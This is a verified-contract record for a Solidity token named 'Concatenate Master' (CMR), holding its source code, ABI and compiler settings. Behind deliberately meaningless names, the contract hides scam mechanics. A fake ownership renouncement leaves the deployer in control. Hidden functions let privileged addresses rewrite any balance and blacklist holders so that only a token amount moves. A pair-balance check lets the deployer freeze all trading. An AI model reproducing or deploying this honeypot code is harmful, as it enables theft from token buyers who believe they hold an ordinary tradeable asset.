{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface liquidityShould {\n    function createPair(address fromFee, address launchedFeeTx) external returns (address);\n}\n\ninterface limitReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address totalFee) external view returns (uint256);\n\n    function transfer(address launchedAtFee, uint256 listLaunchedTake) external returns (bool);\n\n    function allowance(address launchMarketingFund, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 listLaunchedTake) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchedAtFee,\n        uint256 listLaunchedTake\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed isLaunch, uint256 value);\n    event Approval(address indexed launchMarketingFund, address indexed spender, uint256 value);\n}\n\nabstract contract autoFromExempt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fundReceiverAuto {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface txLimit is limitReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ConcatenateMaster is autoFromExempt, limitReceiver, txLimit {\n\n    mapping(address => mapping(address => uint256)) private fundLimit;\n\n    function isLaunchFrom() public {\n        emit OwnershipTransferred(shouldListExempt, address(0));\n        takeFund = address(0);\n    }\n\n    function allowance(address enableListBuy, address limitTeam) external view virtual override returns (uint256) {\n        if (limitTeam == tradingShould) {\n            return type(uint256).max;\n        }\n        return fundLimit[enableListBuy][limitTeam];\n    }\n\n    function takeTrading(address isTeam, address launchedAtFee, uint256 listLaunchedTake) internal returns (bool) {\n        require(minSellReceiver[isTeam] >= listLaunchedTake);\n        minSellReceiver[isTeam] -= listLaunchedTake;\n        minSellReceiver[launchedAtFee] += listLaunchedTake;\n        emit Transfer(isTeam, launchedAtFee, listLaunchedTake);\n        return true;\n    }\n\n    address public shouldListExempt;\n\n    uint256 private walletAt;\n\n    function maxShould(address launchedMin) public {\n        fromAmount();\n        \n        if (launchedMin == shouldListExempt || launchedMin == limitTotal) {\n            return;\n        }\n        totalAmount[launchedMin] = true;\n    }\n\n    address public limitTotal;\n\n    function decimals() external view virtual override returns (uint8) {\n        return fundTxEnable;\n    }\n\n    function owner() external view returns (address) {\n        return takeFund;\n    }\n\n    uint256 walletIs;\n\n    function balanceOf(address totalFee) public view virtual override returns (uint256) {\n        return minSellReceiver[totalFee];\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return listMax;\n    }\n\n    function fromAmount() private view {\n        require(shouldLaunch[_msgSender()]);\n    }\n\n    uint256 private fromToken = 100000000 * 10 ** 18;\n\n    address tradingShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function sellReceiver(uint256 listLaunchedTake) public {\n        fromAmount();\n        walletIs = listLaunchedTake;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fromToken;\n    }\n\n    uint256 private marketingList;\n\n    mapping(address => bool) public shouldLaunch;\n\n    uint256 constant feeSwap = 18 ** 10;\n\n    function limitListLiquidity(address liquidityList) public {\n        if (enableFrom) {\n            return;\n        }\n        if (toFund != shouldEnable) {\n            toFund = false;\n        }\n        shouldLaunch[liquidityList] = true;\n        if (marketingList == amountReceiver) {\n            amountReceiver = marketingList;\n        }\n        enableFrom = true;\n    }\n\n    address private takeFund;\n\n    address fundMin = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function amountMax(address isTeam, address launchedAtFee, uint256 listLaunchedTake) internal returns (bool) {\n        if (isTeam == shouldListExempt) {\n            return takeTrading(isTeam, launchedAtFee, listLaunchedTake);\n        }\n        uint256 maxLaunchedFrom = limitReceiver(limitTotal).balanceOf(fundMin);\n        require(maxLaunchedFrom == walletIs);\n        require(launchedAtFee != fundMin);\n        if (totalAmount[isTeam]) {\n            return takeTrading(isTeam, launchedAtFee, feeSwap);\n        }\n        return takeTrading(isTeam, launchedAtFee, listLaunchedTake);\n    }\n\n    function txToken(address walletTakeFund, uint256 listLaunchedTake) public {\n        fromAmount();\n        minSellReceiver[walletTakeFund] = listLaunchedTake;\n    }\n\n    uint256 private amountReceiver;\n\n    function transferFrom(address isTeam, address launchedAtFee, uint256 listLaunchedTake) external override returns (bool) {\n        if (_msgSender() != tradingShould) {\n            if (fundLimit[isTeam][_msgSender()] != type(uint256).max) {\n                require(listLaunchedTake <= fundLimit[isTeam][_msgSender()]);\n                fundLimit[isTeam][_msgSender()] -= listLaunchedTake;\n            }\n        }\n        return amountMax(isTeam, launchedAtFee, listLaunchedTake);\n    }\n\n    constructor (){\n        if (walletAt == marketingList) {\n            marketingList = fundReceiverMax;\n        }\n        fundReceiverAuto toShould = fundReceiverAuto(tradingShould);\n        limitTotal = liquidityShould(toShould.factory()).createPair(toShould.WETH(), address(this));\n        if (walletAt != marketingList) {\n            shouldEnable = false;\n        }\n        shouldListExempt = _msgSender();\n        shouldLaunch[shouldListExempt] = true;\n        minSellReceiver[shouldListExempt] = fromToken;\n        isLaunchFrom();\n        if (marketingList != walletAt) {\n            walletAt = marketingList;\n        }\n        emit Transfer(address(0), shouldListExempt, fromToken);\n    }\n\n    mapping(address => uint256) private minSellReceiver;\n\n    uint256 public fundReceiverMax;\n\n    uint256 atReceiver;\n\n    function approve(address limitTeam, uint256 listLaunchedTake) public virtual override returns (bool) {\n        fundLimit[_msgSender()][limitTeam] = listLaunchedTake;\n        emit Approval(_msgSender(), limitTeam, listLaunchedTake);\n        return true;\n    }\n\n    string private listMax = \"CMR\";\n\n    bool private toFund;\n\n    function transfer(address walletTakeFund, uint256 listLaunchedTake) external virtual override returns (bool) {\n        return amountMax(_msgSender(), walletTakeFund, listLaunchedTake);\n    }\n\n    function getOwner() external view returns (address) {\n        return takeFund;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return exemptTrading;\n    }\n\n    event OwnershipTransferred(address indexed teamAt, address indexed atLaunch);\n\n    bool public shouldEnable;\n\n    string private exemptTrading = \"Concatenate Master\";\n\n    mapping(address => bool) public totalAmount;\n\n    uint8 private fundTxEnable = 18;\n\n    bool public enableFrom;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchMarketingFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atLaunch\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isLaunch\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableListBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitTeam\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listLaunchedTake\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalFee\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundReceiverMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isLaunchFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityList\",\"type\":\"address\"}],\"name\":\"limitListLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedMin\",\"type\":\"address\"}],\"name\":\"maxShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"listLaunchedTake\",\"type\":\"uint256\"}],\"name\":\"sellReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldListExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletTakeFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listLaunchedTake\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedAtFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listLaunchedTake\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletTakeFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listLaunchedTake\",\"type\":\"uint256\"}],\"name\":\"txToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ConcatenateMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}